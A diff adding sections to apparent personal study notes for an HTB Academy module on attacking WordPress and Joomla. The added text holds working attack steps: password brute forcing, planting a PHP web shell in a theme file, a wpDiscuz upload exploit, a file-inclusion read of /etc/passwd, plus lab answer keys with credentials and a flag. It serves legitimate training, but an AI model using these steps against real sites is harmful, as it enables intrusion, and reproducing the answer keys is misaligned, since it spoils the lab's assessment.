@@ -1,6 +1,6 @@
 # HTB Academy — Attacking Common Applications: Module Notes
 
-**Status:** In progress (Sections 1–3 of 33 complete)
+**Status:** In progress (Sections 1–5 of 33 complete)
 
 ---
 
@@ -161,3 +161,89 @@ Admin access = code execution via theme editor or plugin upload.
 - **wpDiscuz 7.0.4** → Unauthenticated RCE
 - **WP Sitemap Page 1.6.4** → (check for known CVEs)
 - **Contact Form 7 5.4.2** → (check for known CVEs)
+
+---
+
+## Section 4 — Attacking WordPress
+
+### Login Brute Force
+Use WPScan's xmlrpc method — faster than wp-login:
+```
+sudo wpscan --password-attack xmlrpc -t 20 -U <user> -P /usr/share/wordlists/rockyou.txt --url http://<target>
+```
+Lab credentials found: `doug:jessica1`
+
+### RCE via Theme Editor (requires admin access)
+1. Log into `/wp-admin` → Appearance → Theme Editor
+2. Select an **inactive** theme (e.g. Twenty Nineteen) → click Select
+3. Click `404.php` in the file list
+4. Add `system($_GET[0]);` just after the opening comment block
+5. Click Update File → execute commands:
+```
+curl -s "http://<target>/wp-content/themes/twentynineteen/404.php?0=id"
+```
+
+**Critical gotcha:** The file already opens with `<?php` on line 1. Adding `<?php system($_GET[0]); ?>` (with tags) inside it causes a 500 syntax error. Use bare `system($_GET[0]);` only — no opening/closing PHP tags.
+
+**Space gotcha:** Use `%20` not `+` in query strings for system commands passed via curl.
+
+**Flag location gotcha:** The "webroot" flag is NOT in wp-content/uploads — it's a uniquely named file directly in the WordPress install root. Always `ls` the webroot first:
+```
+curl -s "http://<target>/wp-content/themes/twentynineteen/404.php?0=ls%20/var/www/<vhost>/"
+```
+
+### wpDiscuz 7.0.4 — Unauthenticated RCE (CVE-2020-24186)
+File upload bypass — MIME type detection bypassed to upload PHP webshell:
+```
+python3 wp_discuz.py -u http://<target> -p /?p=1
+```
+Script may fail at execution step — use curl directly against the uploaded file:
+```
+curl -s "http://<target>/wp-content/uploads/<year>/<month>/<filename>.php?cmd=id"
+```
+
+### mail-masta 1.0 — Unauthenticated LFI
+Direct file inclusion via `pl` parameter, no validation:
+```
+curl -s "http://<target>/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
+```
+
+---
+
+## Section 5 — Joomla: Discovery & Enumeration
+
+### Fingerprinting
+```
+curl -s http://<target>/administrator/manifests/files/joomla.xml | grep "<version>"
+curl -s http://<target>/README.txt | head -n 5
+```
+
+### Automated Enumeration
+```
+droopescan scan joomla --url http://<target>/
+```
+Install via: `sudo pip3 install droopescan`
+
+### Login Brute Force
+Download: `sudo wget https://raw.githubusercontent.com/ajnik/joomla-bruteforce/master/joomla-brute.py`
+```
+sudo python3 joomla-brute.py -u http://<target> -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
+```
+
+### Key Paths
+- Admin login: `/administrator/index.php`
+- Version info: `/administrator/manifests/files/joomla.xml`
+- Version approx: `/plugins/system/cache/cache.xml`
+- Robots.txt reveals structure: `/administrator/`, `/components/`, `/plugins/`, etc.
+
+### Lab Answers (app.inlanefreight.local)
+- Q1 version: `3.10.0`
+- Q2 password: `turnkey`
+
+---
+
+### Lab Answers
+- Q1 user: `doug`
+- Q2 password: `jessica1`
+- Q3 bash user: `webadmin`
+- Q4 flag: `l00k_ma_unAuth_rc3!` (at `/var/www/blog.inlanefreight.local/flag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt`)
